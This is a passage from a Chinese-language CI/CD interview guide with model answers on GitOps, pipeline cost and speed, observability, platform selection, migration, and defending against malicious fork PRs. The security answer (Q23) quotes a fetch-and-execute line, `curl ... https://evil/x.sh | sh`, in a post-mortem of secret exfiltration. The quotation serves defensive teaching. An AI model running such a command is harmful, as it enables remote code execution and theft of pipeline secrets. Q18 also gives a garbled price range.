- 讲清 GitOps 模式下的 CI 职责：构建 → 测试 → 推镜像（带不可变 tag：commit sha 或镜像摘要 digest）→ 更新"声明期望状态"的 Git 仓库（清单仓库/环境仓库）→ Argo CD/Flux 检测 drift 并同步
- 讲清两种衔接方式：①CI 直接 push 清单仓库（`git push` 更新 image tag）——简单直接，CI 需要写权限；②CI 生成 PR/MR 到清单仓库 + 审批合并——可审计、有门禁，Argo CD 配置 `automated` sync 或 manual sync
- GitLab 侧落地：CI Job 里 `docker build` 后 `docker push` 到 GitLab Registry（或外部 registry），再 `git push` 清单仓库或用 `scripts` 调 Argo CD API（`argocd app sync` 在 CI 里跑属于"反模式"要批判）；Argo CD 里配 `argocd-image-updater`（镜像 tag 变化自动更新清单）也是可选路径
- GitHub 侧落地：build-push-action 推 GHCR，清单仓库更新用 GitHub 自身机制——`workflow_run` 触发下游、`peter-evans/create-pull-request` 生成 PR、或 Argo CD Image Updater / Flux `ImagePolicy`（`latest` 策略 + `ImageRepository`）声明式更新
- 讲清安全边界：GitOps 下"部署权限"从 CI 转移到 Git 仓库 + Argo CD，CI 的写权限要最小化；镜像 tag 不可变（覆盖写 = drift 无法追踪）
- 实践佐证：镜像 digest 追踪、回滚（Argo CD `rollback` / git revert 清单仓库）、多环境（dev/staging/prod 对应不同清单目录）

**减分项：**
- 还在讲"CI 里 `kubectl apply`"——GitOps 模式下这是反模式，不会批判
- 镜像 tag 用 `latest`/可变 tag，drift 与回滚无法追踪
- 说不清"push 镜像后"与"应用更新"之间的衔接（更新清单仓库的两种方式及其取舍）
- 不知道 Argo CD Image Updater / Flux image automation 这类"声明式更新"方案
- 无多环境、回滚实践佐证

**解答：**

GitOps 的本质是"期望状态声明在 Git，一切改变都通过改 Git 完成"，CI 的职责边界因此收敛为：构建不可变镜像 → 推 registry → 更新清单仓库 → 交给 Argo CD/Flux 收敛实际状态。先批判一个反模式：在 CI 里跑 `argocd app sync` 直接触发同步，等于把 GitOps 的声明式循环又拉回命令式，drift 和审计链都断了——正确做法是"只改期望状态，让控制器自己动"。两平台落地框架相同：第一步推镜像，镜像 tag 必须不可变（用 `$CI_COMMIT_SHORT_SHA` 或 `${{ github.sha }}`，绝不覆盖写 `latest`，`latest` 可以另打但只能作为补充别名）；第二步更新清单仓库，两种衔接方式：A) CI 直接 `git push` 清单仓库——快但 CI 需要写清单仓库的权限，且绕过 review；B) CI 生成 PR/MR + 审批——有门禁、可审计，适合 prod 目录。GitLab 侧：镜像推 GitLab Container Registry，清单仓库更新可以 `git push`（用带 `CI_JOB_TOKEN` 的 deploy token）或调 `merge_requests` API 建 MR，然后在 Argo CD Application 里设 `automated: prune: true, selfHeal: true`（自动同步）；想更"声明式"就用 `argocd-image-updater` 监听 registry 的 tag 变化自动更新清单——这样 CI 甚至不需要写清单仓库的权限，是推荐的解耦方向。GitHub 侧：`docker/build-push-action` 推 GHCR 后，清单更新用 `peter-evans/create-pull-request`（生成 PR）或直接 `workflow_run` 事件触发下游更新 Job；Flux 用户则完全用 `ImagePolicy`/`ImageRepository` 做 tag 自动化（声明"用哪个前缀的 tag 的最新版"），CI 只推镜像，清单更新由 Flux 控制器在集群内完成。安全与治理：GitOps 模式下部署权限的主体从"CI 的 kubectl"变成"清单仓库的 merge 权限 + Argo CD 的 sync 策略"，所以清单仓库要开强门禁（见 Q14）与审批；镜像摘要（digest）比 tag 更可靠，重要环境建议把 digest 写进清单（`image: registry/x@sha256:...`）彻底避免"同 tag 内容变了"的歧义。回滚 = `git revert` 清单仓库的提交，Argo CD 自动收敛回旧镜像，比任何 kubectl rollback 都干净。多环境实践：清单仓库按 `apps/<env>/` 分目录，CI 按目标环境只更新对应目录，Argo CD 每环境一个 Application（或 AppSet）。

**延伸考点：** 镜像 digest 与 tag 在清单里的取舍，什么场景必须用 digest？Argo CD `selfHeal` 与 `automated` 的开启/关闭策略（有人手动改集群时怎么防"被 Git 覆盖"）？

---

### Q18. 性能与成本：并行度、缓存命中率、分钟数配额、runner 规模怎么算？

**问题：** 你们 CI 高峰期排队 30 分钟，账单还超了：GitHub Actions 的分钟数用超要加钱，GitLab 的 runner 常驻吃成本。让你做一轮"CI 性能与成本优化"，你会从哪几层入手？怎么量化收益？

**期望加分项：**
- 建立优化层次：①消除无效触发（paths 过滤、跳过 lint-only 变更）→ ②缓存命中率（锁文件键、跨平台分键）→ ③并行度与依赖图（needs/stage 收敛、矩阵裁剪）→ ④执行时长（镜像层缓存、增量编译）→ ⑤算力成本（runner 规格、按需伸缩、自建 vs 托管）
- 成本模型量化：GitHub 分钟数 = Σ(Job 实际执行时间 × 规格倍数)，public repo 免费/private 按 plan 配额，超配按 2 倍价格（约 0.008-0.008$/min 量级）；GitLab 是"runner 自持成本"模型（自建 runner 的机器费 + 维护），SaaS 版有 shared runner 分钟数
- 计算实例：给出真实数字——如"每天 500 次构建 × 平均 6 分钟 × 2 核 = 3000 分钟/天"，配规格倍数与并发限制推导需要的 runner 数量
- 关键优化手段落地：`concurrency` 组（GitHub 同一 PR 的新 push 取消旧 run）、GitLab `interruptible` 属性；缓存命中率监控（GitHub Actions cache 命中数据页 / GitLab 的 CI 分析）；`timeout-minutes` 防失控 Job 烧分钟数
- 决策意识：托管 vs 自建的成本临界点（月运行分钟数超过 X 自建更划算）、spot 实例跑 CI
- 实践佐证：一次优化前后的分钟数/耗时/成本对比表

**减分项：**
- 只会说"加并发"，不算账、不建监控
- 不知道 GitHub 分钟数的计费口径（规格倍数）与超配费率
- 不处理"无效触发"与"失控 Job"（无 timeout、无 concurrency），成本大头漏掉
- 缓存命中率没有监控与基线
- 无量化对比数据

**解答：**

优化要按"成本杠杆"从大到小排序，顺序错了就是"优化了个寂寞"。第一层：消灭无效执行。GitHub 用 `on: push: paths:` / `paths-ignore`（改 README 不触发）、`concurrency:` 组（同一 PR 的连续 push 只保留最新一次 run，旧 run 直接 cancel）；GitLab 用 `rules: changes` 与 `interruptible: true`（新 push 打断旧流水线）。这一层通常能砍 20-40% 执行量，且零风险。第二层：缓存命中率。依赖缓存键绑定锁文件（Q5），镜像层缓存（Q12），目标命中率 85%+，装了缓存后装依赖 3 分钟→30 秒。第三层：并行与依赖图。GitLab 用 `needs` 替代全量 stage 门禁（Q11），GitHub 收束矩阵（Q4）——注意并行不是免费的：GitHub 并发 Job 数上限（如 private repo 默认 20-40 并发）与分钟数计费叠加，并行多了分钟数反而涨，要算"吞吐 vs 成本"的平衡点。第四层：单 Job 时长。增量编译、测试分片（`parallel: N` + `split_tests` 分片）、`timeout-minutes`（默认 360 分钟！给所有 Job 设 10-30 分钟上限，防止死循环 Job 烧掉整月配额，这条最容易被忽视）。成本模型要算清：GitHub 分钟数 = 实际执行秒数 × 规格倍数（2 核=1×，4 核=2×，8 核=4×，Windows/macOS 更大），private 仓库超配额按约 2 倍速率计费；GitLab SaaS 的 shared runner 类似分钟数配额，自建 runner 则是"机器钱 + 维护人力"的固定成本。决策公式：月分钟数估算 = 日构建数 × 平均时长 × 工作日，例如 500 次/天 × 6 分钟 × 21 天 ≈ 63000 分钟/月，用 GitHub 4 核（×2 倍）就是 126000 计费分钟，远超免费配额（2000/月），就要评估自建 runner——自建 4 台 4 核（约 60 美元/月/台）能扛住，比按量便宜 60%+，但代价是维护（Q6）。实践上我见过最漂亮的优化组合：无效触发过滤（-35% 执行量）+ 依赖与镜像缓存（单 Job -60% 时长）+ needs 化（流水线 -45% 时长），整体分钟数下降约 70%，排队从 30 分钟归零，还把 release 流水线从 25 分钟压到 8 分钟。最后，所有优化要有监控闭环：GitHub 的 Actions usage 报表 + cache 命中数据，GitLab 的 CI/CD Analytics 与 runner 利用率，月会复盘"分钟数构成"，否则成本一定会悄悄涨回去。

**延伸考点：** "测试分片"（shard）与"矩阵"的区别——分片是同一套测试按文件切块，矩阵是不同版本组合，你分别在什么场景用？GitHub 的 `workflow_dispatch` 手动触发与 `pull_request` 自动触发的成本怎么分别管控？

---

### Q19. 可观测性：流水线可视化、失败分析、通知告警、指标监控怎么做？

**问题：** 你们流水线经常"昨晚的定时任务失败了没人知道"，或者"部署 Job 卡了 40 分钟没动静"。让你把 CI/CD 的可观测性补起来，GitLab 和 GitHub 上分别有哪些能力？失败告警怎么设计才不会被群里的告警刷屏？

**期望加分项：**
- 平台原生可观测能力：GitLab 的 Pipelines 页（stage 泳道图、Job 日志高亮、Duration/Timing 分析、CI/CD Analytics、流水线"test report"汇总）、GitHub 的 Actions run 页面（job 图、step 展开、重跑、cancelled/failure 分类）
- 告警接入：GitLab 的通知（邮件/Webhook/`after_script` 里调 IM webhook、Slack/DingTalk 集成）、GitHub 的 `actions/notify` 生态或 `run` 里 curl webhook；GitLab 的 `notify` 模板、GitHub 用 `github.event` 上下文拼消息
- 失败分析三板斧：①日志（GitLab 支持搜索/下载，GitHub 支持 `::error::` 注解定位行）②timing 分析（哪一步慢，GitLab 的 Job Duration 报告 / GitHub 的 step 耗时）③重跑策略（GitLab 重跑失败 Job，GitHub rerun failed jobs；flaky test 判定）
- 指标与告警降噪：按"事件重要度"分级（定时任务失败=必须告警；PR 失败=只评论到 PR 不轰炸群；部署失败=高优告警+值班），告警聚合（GitLab 的 pipeline 级别 summary 发一条而非每 Job 一条），`alert` 收敛与恢复通知
- 实践佐证：某次"定时任务静默失败一周"事故 → 建立失败告警；告警疲劳治理（把 20 条/天降到 3 条/天）

**减分项：**
- 只会说"看日志"，不知道两平台的可视化差异（stage 泳道 vs job 图）
- 告警设计一锅端：所有失败都往群里发，刷屏后没人看
- 不知道 `::error::` 注解、step 耗时分析等定位手段
- 无指标（失败率、平均时长、排队时长）监控意识
- 无事故复盘佐证

**解答：**

可观测性分三层：可视化、失败定位、告警降噪。可视化：GitLab 的 Pipeline 页面是"stage 泳道图"（列=stage，块=Job，依赖关系一目了然，看 DAG 用 `needs` 展开视图），自带 CI/CD Analytics（失败率、时长趋势）与 Pipeline timing 分析（哪个 Job 占比最大）；GitHub 的 Actions run 页面是"Job 流图"（缩进树 + 状态色块），每个 step 可展开实时日志，页面右上角 rerun 支持"rerun failed jobs"精准重跑。失败定位三板斧：①日志——GitLab 支持日志搜索/下载/行号定位，GitHub 支持在脚本里输出 `::error::<消息>` 把失败信息直接渲染到 UI 对应 step 上，这是团队 debug 效率的关键；②耗时分析——GitLab 的 Duration 面板 / GitHub 每个 step 的耗时，找"慢点"（通常是全量装依赖或全量构建）再用 Q18 的手段优化；③flaky 判定——同一 commit 重跑失败 Job 看是否稳定复现，GitLab 有 `retry: max: 2`（网络类任务重试），但 flaky test 的正确处理是单独标记与治理而不是无限重试掩盖。告警设计是重灾区，原则是"按事件重要度分级 + 聚合 + 恢复通知"：定时任务（schedule）失败→高优告警（没人主动看，必须推）；PR 流水线失败→只评论到 PR/不进群（作者自己会看到，进群就是刷屏）；部署失败→最高优（值班 on-call + IM 强提示）；flaky/已知失败→静默或 weekly 汇总。聚合：GitLab 用 pipeline 级 `after_script` 里判断整体结果只发一条 summary（而不是 20 个 Job 各发一条）；GitHub 在 workflow 末尾加一个 `if: always()` 的 notify Job，拼好 `${{ github.run_id }}` 链接发一条。恢复通知：失败恢复后要自动发"已恢复"，否则值班的人不知道要不要处理。指标闭环：GitLab CI/CD Analytics 的失败率、平均时长、排队时长，GitHub 的 Actions usage/queue 报告，配合 Q18 的成本监控，月度复盘。真实案例：我们的 nightly 依赖升级任务静默失败一周（没人看 schedule 的 run 页面），后来给所有 schedule Job 挂"失败即 IM 告警"，并顺手把告警按仓库/任务聚合，日告警量从 20+ 降到 3-4 条且条条有人处理。

**延伸考点：** 告警里要带哪些信息才能让值班人"不用打开页面就能判断"（commit、Job、失败步骤、影响范围）？GitHub 的 check-run API 与 GitLab 的 MR widget 在"把失败信息推到 PR/MR 里"有什么差异？

---

### Q20. 平台选型：GitLab CI vs GitHub Actions vs 自建 Jenkins，综合决策框架怎么搭？

**问题：** 公司要做 CI/CD 平台选型，候选是 GitLab CI、GitHub Actions、自建 Jenkins。给 10 分钟，你会从哪些维度做决策？分别适合什么样的团队？有没有什么"看着合适其实是个坑"的误判点？

**期望加分项：**
- 建立决策维度：①代码托管归属（GitHub 仓库用 Actions、GitLab 仓库用 GitLab CI 是天然同构，跨平台要付出代价）②安全与合规（私有化/内网/合规审计→GitLab 自托管或 Jenkins，公有云→GitHub）③成本模型（分钟数按量 vs 自建固定成本 vs Jenkins 全自持）④生态与扩展（GitHub 的 action 市场、GitLab 的一体化内置 vs Jenkins 插件生态）⑤团队技能与维护人力
- 给出典型结论矩阵：开源项目→GitHub Actions（免费分钟数+社区 action）；中型私有企业→GitLab（代码+CI+制品+安全一体化）；强合规/极度定制/遗留系统→Jenkins（全可控但维护成本最高）
- 讲清误判点：①"GitHub 有免费分钟数"——private 仓库分钟数很小，规模一大账单爆炸（Q18）；②"GitLab 自带一切"——自托管 GitLab 的运维成本（升级/备份/高可用）常被低估；③"Jenkins 免费"——插件维护、安全补丁、构建机的隐性成本远超 license；④"Actions 生态多"——第三方 action 的供应链风险要治理（Q15）
- 混合架构意识：同一公司可以"GitHub 管开源 + GitLab 管私有"或"Jenkins 跑特殊硬件任务 + 托管平台跑常规"；但每多一套系统就多一份维护与技能税
- 决策流程：试点验证（拿真实流水线在两个候选平台跑 2 周）→ 量化对比（成本/时长/失败率/维护工时）→ 决策记录（明确弃用理由）

**减分项：**
- 只凭"我喜欢用哪个"拍板，无维度框架
- 不考虑"代码仓库在哪"这一强耦合约束
- 对成本模型理解错误（以为 GitHub Actions 免费、以为 Jenkins 零成本）
- 忽略合规/私有化硬性要求
- 无试点与量化对比，纯主观选型

**解答：**

选型不是选"最好的"，是选"匹配现状与演进方向、总成本最低"的，我给五个维度、一个强约束。强约束是代码托管归属：仓库在 GitHub 上，Actions 的集成是零摩擦（PR 状态、required checks、环境审批全是原生的）；仓库在 GitLab 上则反之。跨平台组合（GitHub 仓库 + GitLab CI）不是不能，但每个集成点（webhook、状态回写、审批）都要自己拼，隐性成本很高——所以决策第一步是"确定代码仓库平台，CI 跟它走"，除非有压倒性理由。五个维度：①安全与合规——有数据出境/内网/等保审计要求，GitHub 公有云默认排除，剩 GitLab 自托管（数据在自家）或 Jenkins；②成本模型——GitHub 按分钟计费（Q18 的公式），月运行分钟数大就贵；GitLab 自托管是"服务器 + 维护人力"固定成本，SaaS 版按用户/分钟数计费；Jenkins 看着免费，但构建机、插件兼容性维护、安全 CVE 补丁的工程师工时通常超过前两者的总费用；③生态——GitHub 的 action 市场最丰富（但供应链风险大，Q15 要治理），GitLab 内置 SAST/容器仓库/环境审批等一体化能力（自建拼装成本低），Jenkins 插件最全但质量参差且大多陈旧；④团队技能——团队会 Jenkins Groovy 且不想学新东西 vs 团队已写 Go/Node 且愿意上 YAML 声明式，技能税也是成本；⑤维护人力——谁养这套系统：GitLab 自托管要升级/备份/高可用，Jenkins 要防插件地狱。典型结论矩阵：开源/社区项目 → GitHub Actions（免费分钟数 + PR 体验最好）；25-200 人、私有代码、要审计与一体化 → GitLab（尤其已用 GitLab 管代码的团队）；遗留系统、强定制、离线环境、已有 Jenkins 技能沉淀 → 维持/迁移到 Jenkins 但要有"单一维护负责人"制度。最后必须走试点：拿一条真实发布流水线在两个候选平台各跑 2 周，对比成本、时长、失败率、调试体验四个数字，结论写在决策记录里（含弃用理由）。误判点提醒：看到"免费分钟数"就选 GitHub 的团队，一般第三个月开始超配账单；选 GitLab 自托管的团队，通常低估了高可用与升级的运维工时；"Jenkins 免费"是最大的幻觉——真正贵的是让它一直健康地活着。

**延伸考点：** 混合架构（托管平台跑常规 + Jenkins 跑特殊硬件/遗留任务）的边界怎么划，什么信号说明该拆了？如果三年后要换平台，什么样的流水线设计能最小化迁移成本（可移植性）？

---

### Q21. 流水线从 30 分钟优化到 10 分钟内，并行、缓存、矩阵、增量怎么组合？

**问题：** 你们一条核心服务的流水线现在要 30 分钟：每轮全量装依赖、单 Job 串行跑完单测再跑集成测试、任何变更都全量构建。把它压到 10 分钟内，并行、缓存、矩阵、增量怎么组合？怎么量化收益？

**期望加分项：**
- 先做耗时分析再动手：GitLab 的 Pipeline timing 分析 / GitHub 的 step 耗时，找出占比最大的环节（通常是装依赖和全量构建），按杠杆排序，避免"优化了个寂寞"
- 并行与依赖图：拆 Job + GitLab `needs`（测试不等全量 build 完）/ GitHub `needs` 显式依赖；同 stage 并行；大测试集按模块拆成并行 Job
- 缓存：依赖缓存键绑定锁文件 hash（package-lock/pnpm-lock/requirements.txt）+ 平台/架构维度；GitHub `actions/cache`、GitLab `cache:key:files`；命中率目标 85%+
- 矩阵：多版本/多平台用 matrix（GitHub）/ `parallel: matrix`（GitLab）一次声明避免复制 Job；矩阵只用在确实需要多版本验证的 Job 上
- 增量：`paths`/`rules: changes` 过滤（改后端不跑前端）、增量编译缓存（remote cache）、测试只跑变更相关（jest `--changedSince`）
- 有量化：优化前后时长、分钟数、缓存命中率对比（如 30 分钟 → 9 分钟、分钟数下降 60%）

**减分项：**
- 不做耗时分析直接堆并行，资源翻倍时长没降
- 缓存键绑全量代码 hash 或不用锁文件，缓存每轮失效形同虚设
- 并行不配 needs/矩阵，Job 依赖错乱或并行度虚高
- 无增量意识，改文档也全量跑
- 无前后数据，收益说不清

**解答：**

优化的第一步不是改流水线，而是用数据找瓶颈。GitLab 用 Pipeline 的定时/耗时分析看每个 Job 占比，GitHub 看 workflow run 里每个 step 的耗时，结果通常一样：装依赖 8-10 分钟、全量构建 10 分钟、测试 8 分钟。按杠杆排序动手。第一刀是缓存：把依赖安装从 8 分钟压到 30 秒——缓存键必须绑定锁文件：GitLab `cache: key: files: ['pnpm-lock.yaml']`，GitHub `actions/cache` 的 `key: ${{ hashFiles('pnpm-lock.yaml') }}`，锁文件没变就命中缓存；命中率要监控（GitHub 的 cache 命中页面 / GitLab 的 CI analytics），目标 85%+。第二刀是并行：把"单 Job 串行跑完所有测试"拆成多个测试 Job——GitLab 同 stage 默认并行、用 `needs` 让测试不再等全量 build；GitHub 拆 Job + `needs` 显式依赖；测试按模块拆分（前端/后端/集成各一个 Job），8 分钟测试变成 3 分钟。第三刀是矩阵：多语言版本/多平台用矩阵一次声明（GitHub `strategy.matrix` / GitLab `parallel: matrix`），避免复制粘贴 Job，但要克制——矩阵会放大构建次数，只在"确实需要多版本验证"的 Job 上矩阵化（lint 单版本、测试按需多版本），否则分钟数先爆炸。第四刀是增量：`rules: changes`（GitLab）/ `on: push: paths:`（GitHub）让"只改后端"不触发前端 Job；增量编译用 remote cache（Bazel 缓存、`tsc --incremental`）；测试用 `--changedSince` 只跑变更相关用例，PR 阶段秒级完成、主干保留全量。最后算总账：我们一条流水线从 30 分钟到 9 分钟，构成是缓存（装依赖 8 分钟 → 40 秒）+ 测试并行拆分（串行 8 分钟 → 并行 3 分钟）+ 增量过滤（无效触发降 60%）+ 增量编译（构建 10 分钟 → 5 分钟）。注意并行不是免费的：分钟数会涨（见 Q18），所以"并行 + 增量"必须搭配，否则账单先爆炸。

**延伸考点：** 测试分片（shards/split_tests）与矩阵的区别是什么，什么场景用哪个？缓存命中率低时怎么定位是键设计问题还是缓存存储配置问题？

---

### Q22. 团队从 GitLab 迁到 GitHub（或反之），流水线迁移怎么规划不翻车？

**问题：** 公司代码要从 GitLab 迁到 GitHub（或反之），几十条流水线要跟着搬。除了仓库迁移，流水线迁移还要处理语法翻译、Secret、Runner、门禁四件事，你怎么规划？最大的坑在哪？

**期望加分项：**
- 语法翻译是"执行模型重写"不是字段替换：`stages` → `needs`、`script` → `run`、`variables` → `env`、`only/except` → `on` + `if`、`artifacts` → `upload-artifact`、`include/extends` → reusable workflow / composite action，注意 stage 隐式串行与 needs 显式 DAG 的差异
- Secret 迁移：逐条映射（GitLab masked/protected variables → GitHub encrypted secrets / Environments），迁移期重新生成而非复制旧值，审计每个 secret 在哪些 Job/step 被使用（`after_script`、自定义 runner 脚本最容易泄露）
- Runner 规划：GitLab runner tags → GitHub self-hosted runner labels；评估 hosted vs self-hosted 的成本与安全（fork PR 跑 self-hosted 的风险，见 Q23）；runner 注册、维护、隔离
- 门禁重建：GitLab "Pipelines must succeed" + approvals → GitHub required status checks（check 名字精确匹配，Job 名/矩阵展开名变了会静默失配）+ branch protection + CODEOWNERS + up-to-date 校验
- 迁移流程：盘点（Job 清单 + owner）→ 试点（1-2 条核心流水线双跑对比产物 hash）→ 模板化批量 → 双跑期 → 切流，保留回退
- 有量化与事故佐证：迁移条数/人周、required check 失配事故、secret 审计结果

**减分项：**
- 把 YAML 机械翻译，不重写执行模型，迁移后并行/顺序全乱
- Secret 直接复制旧值、protected/masked 属性没对等、没审计使用点
- required check 名字失配导致门禁静默失效，合并不受保护
- 没有双跑对比与回退计划，切流即事故
- 无迁移数据佐证

**解答：**

流水线迁移的本质是"按目标平台的执行模型重写"，不是字段翻译。第一步盘点：列出所有流水线和 Job，标注用途、owner、依赖的内网资源（制品库、K8s、Sonar）、用到的变量和 secret。第二步语法翻译：GitLab 的 `stages: [build, test, deploy]` 是隐式串行，到 GitHub 必须显式画 needs——`test` 的每个 Job 都要 `needs: build`，漏写就是所有 Job 一拥而上（这是最典型事故）；`script` → `run`、`variables` → `env`、`only/except` → `on` 触发器 + `if` 条件、`artifacts` → `actions/upload-artifact`、`include/extends` → reusable workflow / composite action。反向迁移（GitHub → GitLab）相对省力，但注意 GitHub 的 Job 内 Step 共享 shell 状态，GitLab 的 Job 之间互相隔离，共享数据只能靠 artifacts/cache。第三步 Secret：逐条映射并重建——GitLab 的 masked/protected variables 对应 GitHub 的 encrypted secrets（仓库级 + Environments 环境级）；迁移期一律重新生成新值而不是复制旧值（旧值可能在旧平台日志里出现过）；做一次 secret 使用点审计，重点查 `after_script` 和自定义 runner 上的脚本——这些位置最容易悄悄把 secret 打出去。第四步 Runner：GitLab runner tags 对应 GitHub self-hosted runner labels；评估成本与安全——开放 fork 的仓库跑 self-hosted runner 有不可信代码风险（Q23），迁移时一起决策，建议 fork PR 走无 secrets 的隔离池。第五步门禁：GitLab 的 "Pipelines must succeed" 对应 GitHub branch protection 里勾 required status checks，最大的坑是 check 名字精确匹配——Job 名或矩阵展开名变了（`test` → `test (18, linux)`），规则静默失配，门禁等于没有；还要勾 up-to-date 防止"旧 commit 的 check 通过后又被推送新代码"照样能合。最后流程兜底：挑 1-2 条核心流水线双跑对比（同一 commit 的产物 hash 一致）→ 模板化批量迁移 → 双跑 2-4 周 → 切流，保留回退开关。我经历的一次迁移：60 条流水线 5 人周，最大事故就是 required check 名失配三天没人发现——所以切流后第一件事是抽查门禁是否真的生效。

**延伸考点：** 迁移双跑期如何保证"两条流水线产物一致"（hash、版本号、制品命名）？GitLab include 与 GitHub reusable workflow 在复用粒度（Job 级 vs 步骤级）上的差异？

---

### Q23. 流水线被恶意 PR/不可信代码攻击导致泄密，怎么复盘与建防护体系？

**问题：** 你们仓库开了 fork 模式，某天一个恶意 PR 的流水线把生产数据库连接串泄露到了外网。事后复盘发现它跑在 self-hosted runner 上、拿到了所有 secrets。这个事件怎么复盘？GitLab/GitHub 上分别怎么建防护体系？

**期望加分项：**
- 复盘框架：时间线（fork PR → 触发流水线 → 恶意脚本执行 → 数据外传）→ 根因（不可信代码在"可信 runner + 全量 secrets"环境执行 = 任意代码执行）→ 影响面（哪些 secret 被读、逐一轮换、日志/制品是否残留、扫描 git 历史）→ 改进项落实到机制
- fork 权限：GitHub `pull_request` 事件默认不注入 secrets，`pull_request_target` 才有 secrets 且跑目标仓库代码——高危，只用于执行"不执行 PR 内容"的受信 step；`if: github.event.pull_request.head.repo.forked == false` 区分来源；GitLab 用 `$CI_PIPELINE_SOURCE` / rules 区分 fork 来源
- Secret 隔离：GitHub Environments 环境级 secret + 保护规则（仅受信分支/手动审批）；GitLab 变量 protected 属性 + masked；`CI_JOB_TOKEN`/`GITHUB_TOKEN` 最小权限；云平台 OIDC（`id_tokens`/OIDC 联邦）替代静态密钥
- Runner 安全：self-hosted runner 与不可信代码物理隔离——fork PR 要么不跑、要么跑在无 secrets 的隔离池/一次性容器里；runner 单 Job 单实例、定时清理
- 供应链防护：action/镜像锁定 commit SHA 而非 tag、依赖锁文件 + 扫描（Dependabot/trivy）、`permissions:` 最小化、secret 泄露检测（push protection）与 revoke + 轮换流程
- 组织流程：PR 审查 + approval 规则、不可信贡献者先人工审核、复盘报告与改进验证（故意提交"打印 secret"的测试 PR 验证基线）

**减分项：**
- 只谈"把 secrets 藏好"，不解决"不可信代码凭什么能跑"这个根因
- 不知道 `pull_request` 与 `pull_request_target` 的 secrets 差异（必考点）
- self-hosted runner 无隔离意识，认为"内网 runner 就安全"
- 复盘不确认影响面、不轮换已泄露 secret，闭环缺失
- 改进项停留在口头，无验证

**解答：**

复盘要用"时间线 + 根因 + 影响面 + 改进"框架走完整。时间线：攻击者在 fork 里提交 PR，流水线自动触发，恶意 `script` 里一行 `curl -s https://evil/x.sh | sh` 读取所有环境变量外传——攻击完成只用了十几秒。根因只有一条：**不可信代码被允许在"可信 runner + 全量 secrets"的环境里执行**，这是 CI/CD 安全的头号风险。影响面确认最关键也最容易被跳过：列出 runner 上所有 secret 的清单，按"全部泄露"假设逐一轮换（数据库密码、云密钥、部署 token），同时检查构建日志和制品里是否残留 secret、扫描 git 历史。改进措施分四层落到机制。第一层 fork 权限与触发源：GitHub 上 `pull_request` 事件（含 fork PR）默认不注入 secrets，这是安全基线；`pull_request_target` 有 secrets 且运行目标仓库（main）的代码——它只能用来执行"不执行 PR 内容的受信 step"（如读 PR 元数据发评论），一旦 checkout 换成 PR 分支并执行其代码，等于把 main 的 secrets 交给攻击者；用 `if: github.event.pull_request.head.repo.forked == false` 让受信 Job 只给同仓库 PR。GitLab 用 `rules: if: $CI_PIPELINE_SOURCE == "merge_request_event"` 加来源判断降级不可信 Job。第二层 Secret 隔离：把关键 secret 放进 GitHub Environments 并加保护规则（只允许 main 分支 + 手动审批）、GitLab 变量加 protected 属性；`GITHUB_TOKEN`/`CI_JOB_TOKEN` 按 Job 最小化权限，能用 OIDC（`id_tokens`）换云平台临时凭据就不用静态 key。第三层 Runner：self-hosted runner 绝不跑不可信代码——fork PR 要么不触发、要么跑在无 secrets 的隔离容器池；hosted runner 对 fork PR 是干净的（无 secrets + 一次性环境）。第四层供应链：第三方 action/镜像锁定 commit SHA 而非可变 tag、依赖锁文件 + Dependabot/trivy 扫描、secret 泄露检测（GitHub push protection）在"推上去的瞬间"拦截，泄露后 revoke + 轮换。最后改进项必须有验证：上线后故意提交一个"打印 secret 到日志"的 fork PR 测试基线，确认攻击路径已被堵死；组织层面配套不可信 PR 先人工审查、approval 规则兜底。

**延伸考点：** 云平台 OIDC / Workload Identity 能根治"静态 secret 外泄"问题吗？还有哪些场景必须用静态 secret？fork PR 的"部署预览"需求如何在不暴露 secrets 的前提下安全落地？

---
